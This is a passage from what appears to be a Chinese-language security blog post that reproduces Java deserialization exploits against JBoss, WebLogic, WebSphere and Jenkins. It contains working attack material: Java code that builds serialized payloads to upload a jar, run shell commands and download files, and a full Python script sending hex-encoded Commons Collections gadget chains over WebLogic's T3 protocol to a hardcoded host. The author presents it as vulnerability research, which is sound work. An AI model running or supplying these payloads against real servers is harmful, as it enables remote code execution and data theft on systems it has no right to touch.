class="keyword">catch</span> (Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> instance;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getPayload(Object instance)&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream(<span class="number">10</span>);</div><div class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bo);</div><div class="line">            out.writeObject(instance);</div><div class="line">            out.flush();</div><div class="line">            out.close();</div><div class="line">            <span class="keyword">return</span> bo.toByteArray();</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 上传jar</span></div><div class="line">    getPayload(fileupload(<span class="string">"util.jar"</span>,filedata));</div><div class="line"></div><div class="line">    <span class="comment">// 执行命令</span></div><div class="line">    getPayload(classInject(<span class="string">"file:util.jar"</span>,<span class="string">"jc.util.CommUtil"</span>,<span class="keyword">new</span> String[]&#123;<span class="string">"data"</span>,<span class="string">"-action"</span>,<span class="string">"runcmd"</span>,<span class="string">"uname -a"</span>&#125;));</div><div class="line">    </div><div class="line">    <span class="comment">// 下载文件</span></div><div class="line">    getPayload(classInject(<span class="string">"file:util.jar"</span>,<span class="string">"jc.util.CommUtil"</span>,<span class="keyword">new</span> String[]&#123;<span class="string">"data"</span>,<span class="string">"-action"</span>,<span class="string">"file-download"</span>,filename&#125;));</div></pre></td></tr></table></figure>
+<p><img src="/images/java-deserialize/java-deserialize-jboss-exec.png" alt="java-deserialize-jboss-exec"></p>
+<h2 id="JBoss-CVE-2017-12149"><a href="#JBoss-CVE-2017-12149" class="headerlink" title="JBoss CVE-2017-12149"></a>JBoss CVE-2017-12149</h2><p>JBoss <code>/invoker/readonly</code> 存在反序列化漏洞，即没有对数据进行任何的安全处理便进行了反序列化处理，造成了漏洞的形成。</p>
+<p>访问服务器的<code>/invoker/readonly</code>页面，服务器返回500错误</p>
+<p><img src="/images/java-deserialize/java-deserialize-jboss-2017-500.png" alt="java-deserialize-jboss-exec"></p>
+<p>这个漏洞的POC和前一个JBoss反序列化漏洞基本相同，所以这里就不贴代码了。</p>
+<p>发送payload后服务端的日志如下：</p>
+<p><img src="/images/java-deserialize/java-deserialize-jboss-2017-log.png" alt="java-deserialize-jboss-exec"></p>
+<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><p>因为weblogic会把异常直接打印到服务器端的控制台上，所以在jboss中通过异常封装回显的方法在weblogic上并不适用。但是weblogic有更方便的方法，weblogic是通过T3协议来传输序列化的类，那我们就可以通过T3协议来实现exploit和server的通信，因为weblogic的T3协议和WEB协议共用同一个端口，所以只要能访问weblogic，就可以利用，不需要加载远程类，因此对服务器能否连外网没有要求。</p>
+<h2 id="T3-协议"><a href="#T3-协议" class="headerlink" title="T3 协议"></a>T3 协议</h2><p>这里主要介绍下T3协议，不想看的可以跳过这里。T3 也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅“管理控制台联机帮助”中的配置 T3 协议。</p>
+<p>使用T3协议向服务器发送数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t3 7.0.0.0\nAS:10\nHL:19\n\n</div></pre></td></tr></table></figure></p>
+<p>第一行为<code>t3</code>加weblogic客户端的<code>版本号</code>。</p>
+<p>weblogic服务器的返回数据为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HELO:10.0.2.0.false\nAS:2048\nHL:19\n\n</div></pre></td></tr></table></figure></p>
+<p>第一行为<code>HELO:</code>加weblogic服务器的<code>版本号</code>。<br>weblogic客户端与服务器发送的数据均以<code>\n\n</code>结尾。</p>
+<p>经测试，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t3 9.2.0\nAS:255\nHL:19\n\n</div></pre></td></tr></table></figure></p>
+<p>字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。</p>
+<p>在收到服务器的返回数据包后，就可了发送poc了。</p>
+<p>poc的结构为：发送的数据长度 + weblogic的固定数据 + 反序列化的恶意代码 + 其他数据，具体如下：</p>
+<p><img src="/images/java-deserialize/weblogic-exec.png" alt="java-deserialize-weblogic-exec"></p>
+<p>即可触发漏洞。</p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>这个版本没有任何的过滤，可直接利用。</p>
+<h2 id="CVE-2016-0638、CVE-2016-3510、CVE-2017-3248"><a href="#CVE-2016-0638、CVE-2016-3510、CVE-2017-3248" class="headerlink" title="CVE-2016-0638、CVE-2016-3510、CVE-2017-3248"></a>CVE-2016-0638、CVE-2016-3510、CVE-2017-3248</h2><p>因为weblogic的补丁是采用黑名单的过滤方式进行修补，容易有绕过的方式，下面就是大佬们的相关脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">t3handshake</span><span class="params">(sock,server_addr)</span>:</span></div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    sock.recv(<span class="number">1024</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'handshake successful'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span><span class="params">(sock,port)</span>:</span></div><div class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(<span class="number">2048</span>)))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock,data)</span>:</span></div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            res += sock.recv(<span class="number">4096</span>)</div><div class="line">            time.sleep(<span class="number">0.1</span>)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> res</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVul</span><span class="params">(res,server_addr,index)</span>:</span></div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;<span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(dip,dport,index)</span>:</span></div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(<span class="number">50</span>)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = <span class="number">7001</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure>
+<h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1><h2 id="CVE-2015-4852-1"><a href="#CVE-2015-4852-1" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>WebSphere的反序列化漏洞发生的位置在SOAP的通信端口8880，使用的通信协议是https，发送的数据是XML格式的数据。</p>
+<p><img src="/images/java-deserialize/websphere-8880.png" alt="java-deserialize-websphere-8880"></p>
+<p>这个版本的Websphere没进行任何的过滤处理，直接进行了反序列化。</p>
+<p>所以只要把恶意代码（和之前jboss的攻击方式一样）base64编码后通过SOAP协议发送至有漏洞的服务器即可命令执行。</p>
+<p><img src="/images/java-deserialize/websphere-8880-exec.png" alt="websphere-8880-exec"></p>
+<h1 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h1><h2 id="CVE-2015-8103"><a href="#CVE-2015-8103" class="headerlink" title="CVE-2015-8103"></a>CVE-2015-8103</h2><p>想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的WEB-INF/jenkins-cli.jar程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。</p>
+<p>jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。</p>
+<p>从下图的head头部可以看到随机的序列化对象的接收入口。</p>
+<p><img src="/images/java-deserialize/jenkins-head.png" alt="jenkins-head"></p>
+<p>X-Jenkins-CLI2-Port是采用SSL加密通信，而如果未解析到X-Jenkins-CLI2-Port头，则会解析X-Jenkins-CLI-Port头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。</p>
+<p>只要将恶意代码序列化后进行base64加密（base64编码后不能有换行），并代替掉之前截到的数据包中的base64字段即可。</p>
+<p><img src="/images/java-deserialize/jenkins-data.png" alt="jenkins-data"></p>
+<p>由于此漏洞的命令执行结果也是不回显的，上传jar包的方式也只能打印到控制台，依旧不能解决回显问题。如果采用nslookup等方式来检测漏洞也常有漏网之鱼（如果服务器不能主动向外发包）。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>花了几天时间复现了这些著名的漏洞，颇有收获，稍微了解了各个中间件的一些情况以及的反序列化漏洞的触发方式。</p>
+<p><a href="https://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">参考文章1</a><br><a href="https://paper.seebug.org/333/" target="_blank" rel="noopener">参考文章2</a><br><a href="https://threathunter.org/topic/594a9d6dde1d70c20885ccd2" target="_blank" rel="noopener">参考文章3</a><br><a href="https://www.iswin.org/2015/11/13/]Apache-CommonsCollections-Deserialized-Vulnerability/" target="_blank" rel="noopener">参考文章4</a><br><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/?from=timeline&amp;isappinstalled=0#h4.2_weblogic" target="_blank" rel="noopener">参考文章5</a><br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic" target="_blank" rel="noopener">参考文章6</a><br><a href="http://blog.nsfocus.net/java-deserialization-vulnerability-comments/" target="_blank" rel="noopener">参考文章7</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">参考文章8</a><br><a href="https://wsygoogol.github.io/2017/09/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/" target="_blank" rel="noopener">参考文章9</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+            <a href="/tags/code-execution/" rel="tag"># code execution</a>
+          
+            <a href="/tags/java-unserialize/" rel="tag"># java unserialize</a>
+          
+            <a href="/tags/jboss/" rel="tag"># jboss</a>
+          
+            <a href="/tags/weblogic/" rel="tag"># weblogic</a>
+          
+            <a href="/tags/jenkins/" rel="tag"># jenkins</a>
+          
+            <a href="/tags/websphere/" rel="tag"># websphere</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/27/sqlmap-code-analysis/" rel="next" title="Sqlmap Code Analysis">
+                <i class="fa fa-chevron-left"></i> Sqlmap Code Analysis
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/23/weblogic-cve-2017-10271/" rel="prev" title="Weblogic CVE-2017-10271 ">
+                Weblogic CVE-2017-10271  <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+      
+        
+          <ul class="sidebar-nav motion-element">
+            <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+              文章目录
+            </li>
+            <li class="sidebar-nav-overview" data-target="site-overview">
+              站点概览
+            </li>
+          </ul>
+        
+      
+
+
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Orleven" />
+          <p class="site-author-name" itemprop="name">Orleven</p>
+           
+              <p class="site-description motion-element" itemprop="description">Life is full of ups and downs.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/ || archive">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-link"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+      
+        
+        <!--noindex-->
+          <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+            <div class="post-toc">
+
+              
+                
+              
+
+              
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#序列化与反序列化"><span class="nav-number">2.</span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Commons-Collections-Java"><span class="nav-number">3.</span> <span class="nav-text">Commons Collections Java</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JBoss"><span class="nav-number">4.</span> <span class="nav-text">JBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-JMXInvokerServlet-反序列化"><span class="nav-number">4.1.</span> <span class="nav-text">JBoss JMXInvokerServlet 反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-CVE-2017-12149"><span class="nav-number">4.2.</span> <span class="nav-text">JBoss CVE-2017-12149</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Weblogic"><span class="nav-number">5.</span> <span class="nav-text">Weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-协议"><span class="nav-number">5.1.</span> <span class="nav-text">T3 协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2015-4852"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2015-4852</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-0638、CVE-2016-3510、CVE-2017-3248"><span class="nav-number">5.3.</span> <span class="nav-text">CVE-2016-0638、CVE-2016-3510、CVE-2017-3248</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebSphere"><span class="nav-number">6.</span> <span 